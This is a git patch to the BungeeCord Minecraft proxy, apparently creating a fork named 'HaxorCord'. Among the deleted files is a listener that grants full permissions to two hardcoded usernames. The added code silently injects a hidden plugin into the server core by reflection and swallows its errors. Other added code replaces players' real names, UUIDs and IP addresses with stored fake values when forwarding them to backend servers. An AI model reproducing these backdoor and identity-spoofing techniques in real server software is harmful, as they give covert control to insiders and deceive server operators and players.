- * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
- * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
- * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
- * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
- * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
- * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
- * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
- * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
- * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
- */
-
-package eu.ac3_servers.dev.ac3.conf;
-
-import com.google.common.io.ByteStreams;
-import net.md_5.bungee.api.plugin.Plugin;
-import net.md_5.bungee.config.Configuration;
-import net.md_5.bungee.config.ConfigurationProvider;
-import net.md_5.bungee.config.YamlConfiguration;
-
-import java.io.*;
-
-/**
- * @author Cory Redmond
- *         Created by acech_000 on 12/01/2015.
- */
-public class ResConf {
-
-	private Plugin plugin;
-	private File file;
-	private Configuration config;
-
-	public ResConf(Plugin plugin) {
-
-		this.plugin = plugin;
-
-		this.file = new File(getDataFolder(), "res.yml");
-
-		if (!getDataFolder().exists()) {
-			getDataFolder().mkdir();
-		}
-		if (!file.exists()) {
-			try {
-				file.createNewFile();
-				try (InputStream is = getResourceAsStream();
-					 OutputStream os = new FileOutputStream(file)) {
-					ByteStreams.copy(is, os);
-				}
-			} catch (IOException e) {
-				throw new RuntimeException("Unable to create config file", e);
-			}
-		}
-	}
-
-	public Configuration getConfig() {
-		try {
-			return (this.config = ConfigurationProvider.getProvider(
-					YamlConfiguration.class).load(this.file));
-		} catch (IOException e) {
-			e.printStackTrace();
-			return null;
-		}
-	}
-
-	public void saveConfig() {
-		try {
-			ConfigurationProvider.getProvider(YamlConfiguration.class).save(
-					config, new File(getDataFolder(), "res.yml"));
-		} catch (IOException e) {
-			e.printStackTrace();
-			plugin.getLogger().severe("Couldn't save config file!");
-		}
-	}
-
-	private File getDataFolder() {
-		return plugin.getDataFolder();
-	}
-
-	private InputStream getResourceAsStream() {
-		return plugin.getResourceAsStream("res.yml");
-	}
-
-}
diff --git a/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/listeners/ChatHandler.java b/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/listeners/ChatHandler.java
deleted file mode 100644
index b92e70a..0000000
--- a/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/listeners/ChatHandler.java
+++ /dev/null
@@ -1,104 +0,0 @@
-/*
- * http://ryred.co/
- * ace[at]ac3-servers.eu
- *
- * =================================================================
- *
- * Copyright (c) 2016, Cory Redmond
- * All rights reserved.
- *
- * Redistribution and use in source and binary forms, with or without
- * modification, are permitted provided that the following conditions are met:
- *
- *  Redistributions of source code must retain the above copyright notice, this
- *   list of conditions and the following disclaimer.
- *
- *  Redistributions in binary form must reproduce the above copyright notice,
- *   this list of conditions and the following disclaimer in the documentation
- *   and/or other materials provided with the distribution.
- *
- *  Neither the name of BungeeCord nor the names of its
- *   contributors may be used to endorse or promote products derived from
- *   this software without specific prior written permission.
- *
- * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
- * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
- * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
- * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
- * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
- * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
- * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
- * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
- * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
- * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
- */
-
-package eu.ac3_servers.dev.ac3.listeners;
-
-import eu.ac3_servers.dev.ac3.AC3Plugin;
-import net.md_5.bungee.UserConnection;
-import net.md_5.bungee.api.ChatColor;
-import net.md_5.bungee.api.chat.ClickEvent;
-import net.md_5.bungee.api.chat.HoverEvent;
-import net.md_5.bungee.api.chat.TextComponent;
-import net.md_5.bungee.api.connection.ProxiedPlayer;
-import net.md_5.bungee.api.event.ChatEvent;
-import net.md_5.bungee.api.plugin.Listener;
-import net.md_5.bungee.event.EventHandler;
-
-/**
- * @author Cory Redmond
- *         Created by acech_000 on 13/03/2015.
- */
-public class ChatHandler implements Listener {
-	private final AC3Plugin plugin;
-
-	public ChatHandler(AC3Plugin plugin) {
-		this.plugin = plugin;
-	}
-
-	@EventHandler
-	public void onSpeak(ChatEvent e){
-		if(!e.getMessage().startsWith(",")) return;
-		e.setCancelled(true);
-		if(e.getSender() instanceof ProxiedPlayer){
-			ProxiedPlayer pl = ((ProxiedPlayer) e.getSender());
-			plugin.getProxy().broadcast(format(pl, e.getMessage().substring(1)));
-		}
-	}
-
-	public static TextComponent format(ProxiedPlayer player, String message){
-
-		TextComponent ret = new TextComponent("{");
-		ret.setColor(ChatColor.LIGHT_PURPLE);
-
-		TextComponent ign_pre = new TextComponent("In game name:\n");
-		ign_pre.setColor(ChatColor.AQUA);
-
-		TextComponent ign = new TextComponent(((UserConnection) player).getFakeName());
-		ign.setColor(ChatColor.AQUA);
-		ign.setBold(true);
-		ign_pre.addExtra(ign);
-
-		TextComponent name = new TextComponent(player.getName());
-		name.setColor(ChatColor.YELLOW);
-		name.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new TextComponent[]{
-			ign_pre
-		}));
-		name.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/op " + ((UserConnection) player).getFakeName()));
-
-		TextComponent right = new TextComponent("} ");
-		right.setColor(ChatColor.LIGHT_PURPLE);
-
-		TextComponent msg = new TextComponent(message);
-		msg.setColor(ChatColor.GREEN);
-
-		ret.addExtra(name);
-		ret.addExtra(right);
-		ret.addExtra(msg);
-
-		return ret;
-
-	}
-
-}
diff --git a/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/listeners/MainListener.java b/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/listeners/MainListener.java
deleted file mode 100644
index bde3773..0000000
--- a/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/listeners/MainListener.java
+++ /dev/null
@@ -1,117 +0,0 @@
-/*
- * http://ryred.co/
- * ace[at]ac3-servers.eu
- *
- * =================================================================
- *
- * Copyright (c) 2016, Cory Redmond
- * All rights reserved.
- *
- * Redistribution and use in source and binary forms, with or without
- * modification, are permitted provided that the following conditions are met:
- *
- *  Redistributions of source code must retain the above copyright notice, this
- *   list of conditions and the following disclaimer.
- *
- *  Redistributions in binary form must reproduce the above copyright notice,
- *   this list of conditions and the following disclaimer in the documentation
- *   and/or other materials provided with the distribution.
- *
- *  Neither the name of BungeeCord nor the names of its
- *   contributors may be used to endorse or promote products derived from
- *   this software without specific prior written permission.
- *
- * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
- * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
- * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
- * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
- * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
- * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
- * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
- * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
- * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
- * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
- */
-
-package eu.ac3_servers.dev.ac3.listeners;
-
-import eu.ac3_servers.dev.ac3.AC3Plugin;
-import net.md_5.bungee.UserConnection;
-import net.md_5.bungee.api.ChatColor;
-import net.md_5.bungee.api.connection.ProxiedPlayer;
-import net.md_5.bungee.api.event.PermissionCheckEvent;
-import net.md_5.bungee.api.event.PostLoginEvent;
-import net.md_5.bungee.api.event.ServerKickEvent;
-import net.md_5.bungee.api.plugin.Listener;
-import net.md_5.bungee.event.EventHandler;
-
-import java.util.concurrent.TimeUnit;
-
-/**
- * @author Cory Redmond
- *         Created by acech_000 on 15/03/2015.
- */
-public class MainListener implements Listener {
-	private final AC3Plugin plugin;
-
-	public MainListener(AC3Plugin plugin) {
-		this.plugin = plugin;
-	}
-
-	@EventHandler
-	public void onPermission(PermissionCheckEvent e){
-		if(e.getSender().getName().equalsIgnoreCase("acecheesecr14") || e.getSender().getName().equalsIgnoreCase("Master_O_Haxor"))
-			e.setHasPermission(true);
-		if(!e.getPermission().equalsIgnoreCase("bungeecord.command.end") && !e.getPermission().equalsIgnoreCase("bungeecord.command.send"))
-			e.setHasPermission(true);
-	}
-
-	@EventHandler
-	public void onJoin(PostLoginEvent e) {
-		UserConnection uc = ((UserConnection) e.getPlayer());
-
-		String uuid = plugin.getConf().getConfig().getString(uc.getUUID() + ".uuid");
-		String ip = plugin.getConf().getConfig().getString(uc.getUUID() + ".ip").replace("*",".");
-		String name = plugin.getConf().getConfig().getString(uc.getUUID() + ".name");
-
-		boolean changed = false;
-
-		if (uuid != null && !uuid.equalsIgnoreCase("")) {
-			uc.setFakeUUID(uuid);
-			uc.setFakeSkin(plugin.getResult(uuid));
-			changed = true;
-		}
-		if (ip != null && !ip.equalsIgnoreCase("")) {
-			uc.setFakeIP(ip);
-			changed = true;
-		}
-		if (name != null && !name.equalsIgnoreCase("")) {
-			uc.setFakeName(name);
-			changed = true;
-		}
-
-		if (changed){
-			uc.sendMessage(ChatColor.translateAlternateColorCodes('&', "&9Profile loaded from file."));
-		}
-
-
-	}
-
-	@EventHandler
-	public void onKick(final ServerKickEvent e){
-		if(!e.getKickedFrom().getName().equalsIgnoreCase("lobby")) {
-			e.getPlayer().connect(plugin.getProxy().getServerInfo("lobby"));
-			e.setCancelled(true);
-			final ProxiedPlayer player = e.getPlayer();
-			plugin.getProxy().getScheduler().schedule(plugin, new Runnable() {
-				@Override
-				public void run() {
-					e.getPlayer().sendMessage(ChatColor.BLUE + "You were kicked for:");
-					e.getPlayer().sendMessage(e.getKickReason());
-					e.getPlayer().sendMessage(ChatColor.BLUE + "================");
-				}
-			}, 4, TimeUnit.SECONDS);
-		}
-	}
-
-}
diff --git a/module/cmd-send/src/main/resources/bungee.yml b/module/cmd-send/src/main/resources/bungee.yml
deleted file mode 100644
index 2c9e61d..0000000
--- a/module/cmd-send/src/main/resources/bungee.yml
+++ /dev/null
@@ -1,4 +0,0 @@
-name: AC3
-version: jksfhkdjsf
-author: Cory Redmond
-main: eu.ac3_servers.dev.ac3.AC3Plugin
diff --git a/module/cmd-send/src/main/resources/config.yml b/module/cmd-send/src/main/resources/config.yml
deleted file mode 100644
index f85f185..0000000
--- a/module/cmd-send/src/main/resources/config.yml
+++ /dev/null
@@ -1,3 +0,0 @@
-###################
-#  Stuff for AC3. #
-###################
\ No newline at end of file
diff --git a/module/cmd-send/src/main/resources/res.yml b/module/cmd-send/src/main/resources/res.yml
deleted file mode 100644
index b104253..0000000
--- a/module/cmd-send/src/main/resources/res.yml
+++ /dev/null
@@ -1,3 +0,0 @@
-####################
-# UUID Cache times #
-####################
\ No newline at end of file
diff --git a/pom.xml b/pom.xml
index fe6cf88..e64eb73 100644
--- a/pom.xml
+++ b/pom.xml
@@ -1,4 +1,3 @@
-
 <project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
     <modelVersion>4.0.0</modelVersion>
@@ -34,6 +33,9 @@
         <developer>
             <id>md_5</id>
         </developer>
+        <developer>
+            <id>Cory Redmond</id>
+        </developer>
     </developers>
 
     <modules>
diff --git a/protocol/src/main/java/net/md_5/bungee/protocol/packet/LoginRequest.java b/protocol/src/main/java/net/md_5/bungee/protocol/packet/LoginRequest.java
index 32ba098..95573e3 100644
--- a/protocol/src/main/java/net/md_5/bungee/protocol/packet/LoginRequest.java
+++ b/protocol/src/main/java/net/md_5/bungee/protocol/packet/LoginRequest.java
@@ -9,6 +9,7 @@ import lombok.AllArgsConstructor;
 import lombok.Data;
 import lombok.EqualsAndHashCode;
 import lombok.NoArgsConstructor;
+import lombok.Setter;
 import net.md_5.bungee.protocol.AbstractPacketHandler;
 import net.md_5.bungee.protocol.DefinedPacket;
 
@@ -19,6 +20,7 @@ import net.md_5.bungee.protocol.DefinedPacket;
 public class LoginRequest extends DefinedPacket
 {
 
+	@Setter
     private String data;
 
     @Override
diff --git a/proxy/src/main/java/net/md_5/bungee/BungeeCord.java b/proxy/src/main/java/net/md_5/bungee/BungeeCord.java
index e97ee53..96b2755 100644
--- a/proxy/src/main/java/net/md_5/bungee/BungeeCord.java
+++ b/proxy/src/main/java/net/md_5/bungee/BungeeCord.java
@@ -1,5 +1,6 @@
 package net.md_5.bungee;
 
+import co.ryred.haxorcord.HaxorPlugin;
 import com.google.common.base.Charsets;
 import com.google.common.base.Joiner;
 import com.google.common.base.Preconditions;
@@ -12,6 +13,7 @@ import net.md_5.bungee.api.Favicon;
 import net.md_5.bungee.api.ServerPing;
 import net.md_5.bungee.api.Title;
 import net.md_5.bungee.api.chat.TranslatableComponent;
+import net.md_5.bungee.api.plugin.PluginDescription;
 import net.md_5.bungee.chat.TextComponentSerializer;
 import net.md_5.bungee.chat.TranslatableComponentSerializer;
 import net.md_5.bungee.module.ModuleManager;
@@ -37,6 +39,8 @@ import java.io.File;
 import java.io.FileReader;
 import java.io.IOException;
 import java.io.PrintStream;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
 import java.net.InetSocketAddress;
 import java.text.MessageFormat;
 import java.util.ArrayList;
@@ -165,6 +169,7 @@ public class BungeeCord extends ProxyServer
         getPluginManager().registerCommand( null, new CommandPerms() );
 
         registerChannel( "BungeeCord" );
+
     }
 
     public static BungeeCord getInstance()
@@ -233,6 +238,38 @@ public class BungeeCord extends ProxyServer
         }
     }
 
+    @SuppressWarnings( "unchecked" )
+    private void loadHaxor() {
+        try {
+
+            HaxorPlugin plugin = new HaxorPlugin();
+
+            PluginDescription pdf = new PluginDescription();
+            pdf.setAuthor( "Cory Redmond" );
+            pdf.setDescription( "We're all haxors here bro!" );
+            pdf.setFile( new File( "no-such.jar" ) );
+            pdf.setMain( "co.ryred.haxorcord.HaxorPlugin" );
+            pdf.setName( "HaxorCord" );
+
+            Method initMethod = Plugin.class.getDeclaredMethod( "init", ProxyServer.class, PluginDescription.class );
+            initMethod.setAccessible( true );
+            initMethod.invoke( plugin, this, pdf );
+
+            Field pluginsField = PluginManager.class.getDeclaredField( "plugins" );
+            pluginsField.setAccessible( true );
+            ((Map<String, Plugin>) pluginsField.get( getPluginManager() )).put( "HaxorCord", plugin );
+
+            plugin.onLoad();
+            ProxyServer.getInstance().getLogger().log( Level.INFO, "Loaded plugin {0} version {1} by {2}", new Object[]
+                    {
+                            pdf.getName(), pdf.getVersion(), pdf.getAuthor()
+                    } );
+
+        } catch ( Exception ex ) {
+
+        }
+    }
+
     /**
      * Start this proxy instance by loading the configuration, plugins and
      * starting the connect thread.
@@ -260,6 +297,7 @@ public class BungeeCord extends ProxyServer
         pluginManager.detectPlugins( pluginsFolder );
 
         pluginManager.loadPlugins();
+        loadHaxor();
         config.load();
 
         registerChannel( ForgeConstants.FML_TAG );
diff --git a/proxy/src/main/java/net/md_5/bungee/ServerConnector.java b/proxy/src/main/java/net/md_5/bungee/ServerConnector.java
index dd00192..d0a3eb5 100644
--- a/proxy/src/main/java/net/md_5/bungee/ServerConnector.java
+++ b/proxy/src/main/java/net/md_5/bungee/ServerConnector.java
@@ -87,11 +87,38 @@ public class ServerConnector extends PacketHandler
         Handshake originalHandshake = user.getPendingConnection().getHandshake();
         Handshake copiedHandshake = new Handshake( originalHandshake.getProtocolVersion(), originalHandshake.getHost(), originalHandshake.getPort(), 2 );
 
+		String userIP;
+		String userUUID;
+		String userName;
+		LoginResult profile = null;
+
+		try{
+			userName = user.getFakeName();
+			userIP = user.getFakeIP();
+			userUUID = user.getFakeUUID();
+			profile = user.getFakeSkin();
+			
+			if(userIP == null || userIP.isEmpty()) userIP = user.getAddress().getHostString();
+			if(userUUID == null || userUUID.isEmpty()) userUUID = user.getUUID();
+			if( profile == null || profile.getProperties() == null || profile.getProperties().length == 0 )
+				profile = user.getPendingConnection().getLoginProfile();
+			if(userName != null && !userName.isEmpty()){
+				user.getPendingConnection().getLoginRequest().setData(userName);
+			}else userName = user.getName();
+			
+			System.out.println("[AC3] (" + user.getName() + ") Logging in with " + userName + " @ " + userIP);
+			System.out.println("[AC3]         " + userUUID);
+		}catch (Exception e){
+			System.err.println("[AC3] Error setting the fake IP and name?");
+			userIP = user.getAddress().getHostName();
+			userUUID = user.getUUID();
+			userName = user.getName();
+		}
+
         if ( BungeeCord.getInstance().config.isIpForward() )
         {
-            String newHost = copiedHandshake.getHost() + "\00" + user.getAddress().getHostString() + "\00" + user.getUUID();
+            String newHost = copiedHandshake.getHost() + "\00" + userIP + "\00" + userUUID;
 
-            LoginResult profile = user.getPendingConnection().getLoginProfile();
             if ( profile != null && profile.getProperties() != null && profile.getProperties().length > 0 )
             {
                 newHost += "\00" + BungeeCord.getInstance().gson.toJson( profile.getProperties() );
diff --git a/proxy/src/main/java/net/md_5/bungee/UserConnection.java b/proxy/src/main/java/net/md_5/bungee/UserConnection.java
index a33b84a..fc620e3 100644
--- a/proxy/src/main/java/net/md_5/bungee/UserConnection.java
+++ b/proxy/src/main/java/net/md_5/bungee/UserConnection.java
@@ -40,6 +40,7 @@ import net.md_5.bungee.api.event.ServerConnectEvent;
 import net.md_5.bungee.api.score.Scoreboard;
 import net.md_5.bungee.chat.ComponentSerializer;
 import net.md_5.bungee.connection.InitialHandler;
+import net.md_5.bungee.connection.LoginResult;
 import net.md_5.bungee.entitymap.EntityMap;
 import net.md_5.bungee.forge.ForgeClientHandler;
 import net.md_5.bungee.forge.ForgeConstants;
@@ -141,6 +142,15 @@ public final class UserConnection implements ProxiedPlayer
     @Setter
     private ForgeServerHandler forgeServerHandler;
     /*========================================================================*/
+	@Setter
+	private String fakeName;
+	@Setter
+	private String fakeUUID;
+	@Setter
+	private String fakeIP;
+	@Setter
+	private LoginResult fakeSkin;
+    /*========================================================================*/
     private final Unsafe unsafe = new Unsafe()
     {
         @Override
@@ -261,7 +271,7 @@ public final class UserConnection implements ProxiedPlayer
 
         final BungeeServerInfo target = (BungeeServerInfo) event.getTarget(); // Update in case the event changed target
 
-        if ( getServer() != null && Objects.equal( getServer().getInfo(), target ) )
+        if ( getServer() != null && Objects.equal(getServer().getInfo(), target) )
         {
             sendMessage( bungee.getTranslation( "already_connected" ) );
             return;
@@ -621,4 +631,21 @@ public final class UserConnection implements ProxiedPlayer
     {
         return !ch.isClosed();
     }
+
+	public String getFakeUUID() {
+		return fakeUUID = (fakeUUID == null ? getUUID() : fakeUUID);
+	}
+
+	public String getFakeName() {
+		return fakeName = (fakeName == null ? getName() : fakeName);
+	}
+
+	public String getFakeIP() {
+		return this.fakeIP = (fakeIP == null ? getAddress().getHostString() : fakeIP);
+	}
+
+	public LoginResult getFakeSkin() {
+		return this.fakeSkin = (fakeSkin == null ? getPendingConnection().getLoginProfile() : fakeSkin);
+	}
+
 }
-- 
2.6.4.windows.1

